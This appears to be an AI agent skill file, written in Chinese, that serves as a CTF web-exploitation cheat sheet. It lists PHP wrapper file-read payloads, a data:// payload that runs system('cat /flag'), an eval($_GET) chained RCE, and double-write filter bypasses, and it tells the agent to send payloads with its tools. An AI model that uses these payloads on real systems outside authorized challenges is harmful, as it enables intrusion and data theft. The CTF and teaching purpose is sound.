---
name: ctf-web
description: CTF Web攻击知识库 — PHP弱比较绕过、命令注入空格绕过、eval回显技巧、SSTI注入链、反序列化利用链、PHP代码审计checklist、常见flag位置
---

# CTF Web 攻击知识库

针对 CTF Web 题目的实战知识库，提供**具体绕过值、payload 模板、代码审计 checklist**，而非渗透测试方法论。

**与 `web-security-advanced` 的区别**：
- `web-security-advanced` → 渗透测试方法论（怎么系统性测试一个 Web 应用）
- `ctf-web` → CTF 实战知识库（PHP 弱比较用什么值、空格怎么绕过、eval 输出怎么回显）

## 核心原则

1. **精确值优于方法论** — 提供可直接使用的绕过值和 payload，而非"可以尝试"的建议
2. **工具验证** — 所有 payload 必须用 `fetch` 或 `python_execute` 工具实际发送验证，不猜测结果
3. **路径选择** — 多条利用路径时，优先选过滤最少、最简单的
4. **失败记录** — 某个 payload 失败后立即记录，不重复尝试

## First-Pass 工作流（CTF Web 题标准流程）

1. 访问目标 URL，查看页面源码、HTTP 头、Cookie
2. **如源码含 `highlight_file` → 用 python_execute + strip_tags 提取纯源码**（fetch 输出可能误读）
3. 检查 robots.txt、.git/、.svn/、备份文件（index.php.bak、www.zip 等）
4. 目录扫描（常见：/flag、/admin、/login、/upload、/api）
5. 如有源码 → 进入代码审计模式（见 `php-code-audit-checklist.md`）
6. 如无源码 → 主动探测注入点、上传点、文件包含

## 场景路由

| 场景 | 参考文档 | 核心内容 |
|------|---------|---------|
| ⭐ PHP 伪协议读文件（遇到文件包含/参数传文件名时优先尝试） | 见下方「PHP 伪协议速查」 | `php://filter` 直接读源码/flag |
| 源码提取 | `source-code-extraction.md` | strip_tags 提取、php://filter、.phps、备份文件、完整性校验 |
| PHP 弱比较/类型绕过 | `php-bypass-cheatsheet.md` | 0e 开头 MD5 值大全、数组绕过、extract() 覆写 |
| ⭐ MD5 弱比较碰撞（`md5(a)==md5(b)` 弱比较） | `php-bypass-cheatsheet.md` | ⚠️ 0e 后必须纯数字！直接用 `QNKCDZO`+`240610708` 等已验证值 |
| ⭐ preg_replace/str_replace 双写绕过 | 见下方「双写绕过速查」 | `NSSNSSCTFCTF` → 替换后 = `NSSCTF` |
| 命令注入空格绕过 | `command-injection-bypass.md` | ${IFS}/$IFS$9/</%09/%0a 全表 |
| eval/RCE 技巧 | `eval-and-rce-techniques.md` | system/exec/passthru 区别、highlight_file 输出顺序、无回显外带 |
| SSTI 注入链 | `ssti-injection-chains.md` | Jinja2/Twig/ERB/Mako 等注入链速查 |
| 反序列化利用链 | `deserialization-playbook.md` | PHP/Java/Python 反序列化、SoapClient CRLF |
| 文件上传 → RCE | `file-upload-to-rce.md` | .htaccess 绕过、日志投毒、多语言 Webshell |
| CTF 快速参考 | `web-ctf-quick-reference.md` | flag 位置、常见链形状、响应头 hint |
| PHP 代码审计 | `php-code-audit-checklist.md` | 输入入口→过滤→危险函数→输出分析 |

## ⭐ PHP 伪协议速查（文件包含/参数传文件名时优先尝试）

**触发条件**：当题目出现以下任一特征时，**先试 php://filter 再想其他方法**：

| 触发特征 | 示例 |
|---------|------|
| 参数接受文件名/路径 | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
| `include` / `require` / `include_once` | 源码中有这些函数 |
| 页面展示源码 | `highlight_file()` / `show_source()` |
| 题目要求"读文件"或"找 flag" | 明确要读取服务器文件 |

### 伪协议 Payload 速查

```
# 1. 读 PHP 源码（base64 编码，避免 PHP 执行）
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php

# 2. 读 PHP 源码（rot13 编码）
?file=php://filter/read=string.rot13/resource=flag.php

# 3. 直接读文件（如 .txt/.log 等非 PHP 文件）
?file=php://filter/resource=/etc/passwd

# 4. 代码执行
?file=php://input  (POST body 中放 PHP 代码)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### ⚠️ 关键提醒

1. **不要只想着"绕过"，先想能不能"直接读"** — 很多题目的参数接受文件名，可以直接用伪协议读 flag.php，根本不需要绕过任何过滤
2. **`convert.base64-encode` 是万能读取器** — PHP 文件被 include 会执行，但 base64 编码后不会执行，可以拿到源码
3. **参数名不一定叫 `file`** — 可能是 `page`、`num`、`path`、`template` 等，只要参数值被当作文件路径/名处理就可能有效
4. **拿到 base64 后用 `crypto_decode` 工具解码** — 不要自己脑补解码结果

## 常见 flag 位置速查

**⚠️ RCE 得手后，必须按以下优先级测试 flag 位置，不要停留在当前目录的 flag.php：**

```
优先级 1（最常见）: cat /flag
优先级 2:           cat /flag.txt
优先级 3:           ls /  → 找到根目录的 flag 文件名
优先级 4:           cat /var/www/html/flag.php
优先级 5:           cat /home/ctf/flag
优先级 6:           cat /root/flag
其他位置:           /environment, /proc/self/environ, env 命令
```

**注意**：`ls` 默认列当前目录（`/var/www/html/`），根目录的 `/flag` 需要 `ls /` 才能看到。

## 常见 CTF Web 题型速判

| 题目特征 | 可能考点 | 推荐参考 |
|---------|---------|---------|
| 参数接受文件名/路径 | ⭐ **先试 php://filter 读 flag** | 见上方「PHP 伪协议速查」 |
| 页面只有登录框 | SQL 注入 / 弱口令 / 条件竞争 | php-bypass-cheatsheet.md |
| 页面有代码展示 | 代码审计 | php-code-audit-checklist.md |
| eval/system 字样 | RCE + 空格/关键字绕过 | eval-and-rce-techniques.md + command-injection-bypass.md |
| eval + 长度限制 | RCE + `$_GET` 链式传参绕长度 | 见下方「RCE + 长度限制绕过」 |
| 文件上传功能 | 后缀绕过 / MIME 绕过 | file-upload-to-rce.md |
| 页面模板渲染 | SSTI | ssti-injection-chains.md |
| 序列化/反序列化 | PHP/Java 反序列化 | deserialization-playbook.md |
| 有 WAF/过滤提示 | 正则绕过 / 编码绕过 | php-bypass-cheatsheet.md + command-injection-bypass.md |

## RCE + 长度限制绕过（首推策略）

当 `eval()` 有 `strlen()` 长度限制时（如 ≤ 18 字符），**首推 `$_GET` 链式传参**：

### 标准解法

```
?get=eval($_GET['A']);&A=system('cat /flag');
```

**原理**：
- `eval($_GET['A'])` = 16 字符，通过长度限制
- 真正的命令在第二个 GET 参数 `A` 中，没有长度限制
- PHP 会先执行 `eval()`，将 `$_GET['A']` 的值作为 PHP 代码执行

### 变体

| 长度限制 | payload | 字符数 |
|---------|---------|--------|
| ≤ 18 | `eval($_GET['A']);` | 16 |
| ≤ 18 | `eval($_GET[0]);` | 14 |
| ≤ 16 | `eval($_GET[A]);` | 13（无引号，PHP 自动转字符串） |
| ≤ 12 | `$_GET[0]();` | 10（A 参数传函数名如 `system`，另一个参数传命令） |

### 注意事项
- 不要花时间在缩短 payload 上（如用 `?>` 退出 PHP 模式、用反引号等），**链式传参是通用解法**
- 双 GET 参数 URL 格式：`?get=eval($_GET['A']);&A=system('cat /flag');`
- 用 `python_execute` 工具构造请求，而非 fetch 工具（fetch 可能不支持多参数）

## ⭐ preg_replace / str_replace 双写绕过速查

**触发条件**：源码含 `preg_replace('/X/', '', $str)` 或 `str_replace('X', '', $str)`，且替换后需 `$str === "X"`

### 核心原理
在关键词中间嵌入完整关键词，替换删除内层后，外层拼合出原词。

### 通用构造公式
```
输入 = 关键词前半 + 关键词 + 关键词后半
```

### 常见过滤词速查表

| 过滤关键词 | 双写输入 | 替换过程 | 结果 |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | 删中间NSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | 删中间flag → fl+ag | `flag` ✅ |
| cat | `cacatt` | 删中间cat → ca+t | `cat` ✅ |
| system | `syssystemtem` | 删中间system → sys+tem | `system` ✅ |
| hack | `hahackck` | 删中间hack → ha+ck | `hack` ✅ |
| cmd | `cmcmdd` | 删中间cmd → cm+d | `cmd` ✅ |
| exec | `exexecec` | 删中间exec → ex+ec | `exec` ✅ |

### ⚠️ 关键注意事项
1. **大小写绕过不适用** — 替换后返回 `NssCTF`，不等于 `"NSSCTF"`，严格比较失败
2. **识别信号** — 看到 `preg_replace('/X/', '', $str)` + `$str === "X"` → 立即双写
3. **str_replace 同理** — `str_replace` 也是一次替换，双写同样有效
4. **多次替换** — 如果代码多次调用 `preg_replace`，可能需要三写/四写，但 CTF 中通常只需双写
